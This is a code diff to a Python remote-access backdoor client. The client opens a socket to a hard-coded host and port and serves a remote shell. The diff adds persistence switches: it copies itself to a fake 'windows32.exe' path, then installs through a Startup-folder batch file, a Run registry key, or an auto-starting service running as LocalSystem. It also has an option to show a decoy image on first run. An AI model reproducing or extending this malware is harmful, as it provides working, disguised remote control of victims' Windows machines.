@@ -14,6 +14,10 @@ from mss import mss
 HOST = '192.168.0.94'
 PORT = 54321
 pers_loc = os.environ['appdata'] + '\\Microsoft\\Windows\\System32\\windows32.exe'
+persist_run = False     # Implements persistence through RUN registry key - User Permissions
+persist_srv = False      # Implements persistence through Services registry key - NT Authority/System permissions
+persist_stu = True      # Implements persistence through Start Up user folder - User permissions
+isimage = False         # Will open an image the first time it executes itself
 
 
 def get_help():
@@ -151,15 +155,26 @@ def shell(_s):
             reliable_send(_s, result)
 
 
-def client():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        connection(s)
-        with s:
-            shell(s)
+def create_dir(_dir):
+    if not os.path.exists('\\'.join(_dir.split('\\')[:-1])):
+        print("Directory to create: ", '\\'.join(_dir.split('\\')[:-1]))
+        os.makedirs('\\'.join(_dir.split('\\')[:-1]))
+
+
+def persistence_stu(_pers_loc):
+    if not os.path.exists(_pers_loc):
+        create_dir(_pers_loc)
+        shutil.copyfile(sys.executable, _pers_loc)
+        startup = os.environ['appdata'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\W32Service.bat'
+        if not os.path.exists(startup):
+            with open(startup, 'wb') as f:
+                f.write(_pers_loc)
+                f.close()
 
 
 def persistence_run(_pers_loc):
     if not os.path.exists(_pers_loc):
+        create_dir(_pers_loc)
         shutil.copyfile(sys.executable, _pers_loc)
         subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                         '/v IT_Win_Service32 /t REG_SZ /d "' + _pers_loc + '"', shell=True)
@@ -167,27 +182,36 @@ def persistence_run(_pers_loc):
 
 def persistence_service(_pers_loc):
     if not os.path.exists(_pers_loc):
-        if not os.path.exists('\\'.join(_pers_loc.split('\\')[:-1])):
-            print("Directory to create: ", '\\'.join(_pers_loc.split('\\')[:-1]))
-            os.makedirs('\\'.join(_pers_loc.split('\\')[:-1]))
+        create_dir(_pers_loc)
         shutil.copyfile(sys.executable, _pers_loc)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
                         '/v ImagePath /t REG_EXPAND_SZ /d "' + _pers_loc + '"', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
                         '/v Type /t REG_DWORD /d 16', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
                         '/v Start /t REG_DWORD /d 2', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
                         '/v ErrorControl /t REG_DWORD /d 0', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
                         '/v DisplayName /t REG_SZ /d "' + _pers_loc.split('\\')[-1] + '"', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
                         '/v DependOnService /t REG_MULTI_SZ /d Tcpip', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
                         '/v ObjectName /t REG_SZ /d LocalSystem', shell=True)
 
 
-#persistence_run(pers_loc)
-persistence_service(pers_loc)
+def client():
+    if persist_run:
+        persistence_run(pers_loc)
+    if persist_srv:
+        persistence_service(pers_loc)
+    if persist_stu:
+        persistence_stu(pers_loc)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        connection(s)
+        with s:
+            shell(s)
+
+
 client()
